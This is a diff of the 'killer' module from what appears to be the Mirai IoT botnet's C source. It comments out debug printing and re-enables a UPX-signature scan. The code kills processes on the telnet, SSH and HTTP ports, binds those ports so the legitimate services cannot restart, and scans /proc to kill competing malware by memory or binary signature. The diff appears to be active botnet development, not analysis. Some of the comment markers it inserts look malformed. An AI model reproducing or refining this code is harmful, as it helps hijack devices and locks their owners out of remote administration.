@@ -1,8 +1,8 @@
 #define _GNU_SOURCE
-
+/*
 #ifdef DEBUG
 #include <stdio.h>
-#endif
+#endif*/
 #include <unistd.h>
 #include <stdlib.h>
 #include <arpa/inet.h>
@@ -37,19 +37,19 @@ void killer_init(void)
     tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;
 
     // Kill telnet service and prevent it from restarting
-#ifdef KILLER_REBIND_TELNET
+#ifdef KILLER_REBIND_TELNET/*
 #ifdef DEBUG
     printf("[killer] Trying to kill port 23\n");
-#endif
+#endif*/
     if (killer_kill_by_port(htons(23)))
-    {
+    {/*
 #ifdef DEBUG
         printf("[killer] Killed tcp/23 (telnet)\n");
-#endif
-    } else {
+#endif*/
+    } else {/*
 #ifdef DEBUG
         printf("[killer] Failed to kill port 23\n");
-#endif
+#endif*/
     }
     tmp_bind_addr.sin_port = htons(23);
 
@@ -57,19 +57,19 @@ void killer_init(void)
     {
         bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
         listen(tmp_bind_fd, 1);
-    }
+    }/*
 #ifdef DEBUG
     printf("[killer] Bound to tcp/23 (telnet)\n");
-#endif
+#endif*/
 #endif
 
     // Kill SSH service and prevent it from restarting
 #ifdef KILLER_REBIND_SSH
     if (killer_kill_by_port(htons(22)))
-    {
+    {/*
 #ifdef DEBUG
         printf("[killer] Killed tcp/22 (SSH)\n");
-#endif
+#endif*/
     }
     tmp_bind_addr.sin_port = htons(22);
 
@@ -77,19 +77,19 @@ void killer_init(void)
     {
         bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
         listen(tmp_bind_fd, 1);
-    }
+    }/*
 #ifdef DEBUG
     printf("[killer] Bound to tcp/22 (SSH)\n");
-#endif
+#endif*/
 #endif
 
     // Kill HTTP service and prevent it from restarting
 #ifdef KILLER_REBIND_HTTP
     if (killer_kill_by_port(htons(80)))
-    {
+    {/*
 #ifdef DEBUG
         printf("[killer] Killed tcp/80 (http)\n");
-#endif
+#endif*/
     }
     tmp_bind_addr.sin_port = htons(80);
 
@@ -97,10 +97,10 @@ void killer_init(void)
     {
         bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
         listen(tmp_bind_fd, 1);
-    }
+    }/*
 #ifdef DEBUG
     printf("[killer] Bound to tcp/80 (http)\n");
-#endif
+#endif*/
 #endif
 
     // In case the binary is getting deleted, we want to get the REAL realpath
@@ -111,15 +111,15 @@ void killer_init(void)
     killer_realpath_len = 0;
 
     if (!has_exe_access())
-    {
+    {/*
 #ifdef DEBUG
         printf("[killer] Machine does not have /proc/$pid/exe\n");
-#endif
+#endif*/
         return;
-    }
+    }/*
 #ifdef DEBUG
     printf("[killer] Memory scanning processes\n");
-#endif
+#endif*/
 
     while (TRUE)
     {
@@ -128,10 +128,10 @@ void killer_init(void)
 
         table_unlock_val(TABLE_KILLER_PROC);
         if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
-        {
+        {/*
 #ifdef DEBUG
             printf("[killer] Failed to open /proc!\n");
-#endif
+#endif*/
             break;
         }
         table_lock_val(TABLE_KILLER_PROC);
@@ -150,10 +150,10 @@ void killer_init(void)
             if (pid <= killer_highest_pid)
             {
                 if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME) // If more than KILLER_RESTART_SCAN_TIME has passed, restart scans from lowest PID for process wrap
-                {
+                {/*
 #ifdef DEBUG
                     printf("[killer] %d seconds have passed since last scan. Re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);
-#endif
+#endif*/
                     killer_highest_pid = KILLER_MIN_PID;
                 }
                 else
@@ -205,32 +205,31 @@ void killer_init(void)
                     continue;
 
                 if ((fd = open(realpath, O_RDONLY)) == -1)
-                {
+                {/*
 #ifdef DEBUG
                     printf("[killer] Process '%s' has deleted binary!\n", realpath);
-#endif
+#endif*/
                     kill(pid, 9);
                 }
                 close(fd);
             }
 
             if (memory_scan_match(exe_path))
-            {
+            {/*
 #ifdef DEBUG
                 printf("[killer] Memory scan match for binary %s\n", exe_path);
-#endif
+#endif*/
                 kill(pid, 9);
             } 
 
-            /*
+            
             if (upx_scan_match(exe_path, status_path))
-            {
+            {/*
 #ifdef DEBUG
                 printf("[killer] UPX scan match for binary %s\n", exe_path);
-#endif
+#endif*/
                 kill(pid, 9);
             }
-            */
 
             // Don't let others memory scan!!!
             util_zero(exe_path, sizeof (exe_path));
@@ -241,10 +240,10 @@ void killer_init(void)
 
         closedir(dir);
     }
-
+/*
 #ifdef DEBUG
     printf("[killer] Finished\n");
-#endif
+#endif*/
 }
 
 void killer_kill(void)
@@ -262,10 +261,10 @@ BOOL killer_kill_by_port(port_t port)
     char *ptr_path = path;
     int ret = 0;
     char port_str[16];
-
+/*
 #ifdef DEBUG
     printf("[killer] Finding and killing processes holding port %d\n", ntohs(port));
-#endif
+#endif*/
 
     util_itoa(ntohs(port), 16, port_str);
     if (util_strlen(port_str) == 2)
@@ -345,20 +344,20 @@ BOOL killer_kill_by_port(port_t port)
 
     // If we failed to find it, lock everything and move on
     if (util_strlen(inode) == 0)
-    {
+    {/*
 #ifdef DEBUG
         printf("Failed to find inode for port %d\n", ntohs(port));
-#endif
+#endif*/
         table_lock_val(TABLE_KILLER_PROC);
         table_lock_val(TABLE_KILLER_EXE);
         table_lock_val(TABLE_KILLER_FD);
 
         return 0;
     }
-
+/*
 #ifdef DEBUG
     printf("Found inode \"%s\" for port %d\n", inode, ntohs(port));
-#endif
+#endif*/
 
     if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
     {
@@ -397,8 +396,8 @@ BOOL killer_kill_by_port(port_t port)
 
                     if (util_stristr(exe, util_strlen(exe), inode) != -1)
                     {
-#ifdef DEBUG
-                        printf("[killer] Found pid %d for port %d\n", util_atoi(pid, 10), ntohs(port));
+#ifdef DEBUG/*
+                        printf("[killer] Found pid %d for port %d\n", util_atoi(pid, 10), ntohs(port));*/
 #else
                         kill(util_atoi(pid, 10), 9);
 #endif
@@ -435,10 +434,10 @@ static BOOL has_exe_access(void)
 
     // Try to open file
     if ((fd = open(path, O_RDONLY)) == -1)
-    {
+    {/*
 #ifdef DEBUG
         printf("[killer] Failed to open()\n");
-#endif
+#endif*/
         return FALSE;
     }
     close(fd);
@@ -448,10 +447,10 @@ static BOOL has_exe_access(void)
 
     if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1)
     {
-        killer_realpath[k_rp_len] = '\0';
+        killer_realpath[k_rp_len] = '\0';/*
 #ifdef DEBUG
         printf("[killer] Detected we are running out of `%s`\n", killer_realpath);
-#endif
+#endif*/
     }
 
     util_zero(path, ptr_path - path);
